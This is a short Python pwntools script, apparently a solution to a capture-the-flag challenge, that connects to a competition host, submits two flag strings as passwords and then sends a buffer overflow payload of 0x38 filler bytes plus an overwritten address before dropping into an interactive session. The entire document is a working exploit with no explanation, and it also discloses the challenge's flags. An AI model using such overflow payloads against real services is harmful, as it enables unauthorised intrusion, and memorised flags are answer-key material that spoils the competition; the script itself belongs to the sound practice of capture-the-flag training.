from pwn import *

r = remote('mngmnt-iface.ctfcompetition.com', 1337)
r.send('1\n')
r.send('CTF{I_luv_buggy_sOFtware}\n')
r.send('CTF{Two_PasSworDz_Better_th4n_1_k?}\n')
r.send('A'*0x38 + '\x49\x43\x41\x41\x00\x00\n')
r.interactive()
